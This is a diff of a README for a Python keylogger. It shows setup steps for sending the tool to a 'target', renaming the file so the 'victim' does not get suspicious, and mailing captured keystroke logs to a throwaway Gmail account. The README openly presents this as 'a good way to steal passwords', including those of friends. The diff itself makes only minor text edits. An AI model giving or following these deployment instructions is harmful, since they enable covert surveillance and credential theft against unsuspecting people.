@@ -50,10 +50,10 @@ python send_email.py
 ### Setup:
 
 #### (1)- download code/send code to target
-#### (2) - Open terminal and type pip install pyxhook (if it dosnt work download this module manually like i did), pip install os and pip install smtplib. Also fill in your email credentials, password, emails body, etc. in the send_email.py file. Also turn on less secure Less secure app access so python can send a email using that gmail(i would recommend using a trash account for this or make a new one for this  because its not a great idea to use your main account for this).
+#### (2) - Open terminal and type pip install pyxhook (if it dosnt work download this module manually like i did). Also fill in your email credentials, password, emails body, etc. in the send_email.py file. Also turn on less secure Less secure app access so python can send a email using that gmail(i would recommend using a trash account for this or make a new one for this  because its not a great idea to use your main account for this).
 #### (3) - cd to the file you saved it to from terminal. eg.- cd /home/sirus-black4/Desktop/Downloads/junk/7/keylogger-python-main/
 #### (4) - execute keylogger.py to start the keylogger (remember to change the name of this file to something else because your victim might get suspicious.)
-#### (5) - execute the send_email.py to send a email to your self with the file were the logs were saved (remember that you must save the send_email.py file in the same location were the logs are being saved (~/Desktop/file.log). The keylogger.py file can be stored anywhere.
+#### (5) - execute the send_email.py to send a email to your self with the file where the logs were saved (remember that you must save the send_email.py file in the same location were the logs are being saved (~/Desktop/file.log). The keylogger.py file can be stored anywhere.
 #### (6) - Thats all! You will get a email with a attachment of the file.log. pretty cool right? now you can see what your victim is typing, a good way to steal passwords don't you think? you can get creative and use it in different ways like using the keylogger on yourself when your friends want to log into their account or something on your pc.
 
 
